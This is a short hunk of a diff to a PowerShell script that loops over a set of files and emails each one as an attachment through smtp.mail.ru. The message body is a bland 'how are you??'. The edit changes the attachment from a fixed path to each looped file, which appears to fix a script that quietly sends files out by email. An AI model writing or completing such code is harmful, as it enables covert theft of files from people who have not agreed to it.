@@ -16,7 +16,7 @@ foreach($file in $items){
     $Body = "how are you??"
     $smtpServer = "smtp.mail.ru" 
     $smtpMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
-    $attach = new-object Net.Mail.Attachment($attachment)
+    $attach = new-object Net.Mail.Attachment($file)
     $smtpMessage.Attachments.Add($attach)
     $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
     $SMTPClient.EnableSsl = $true 
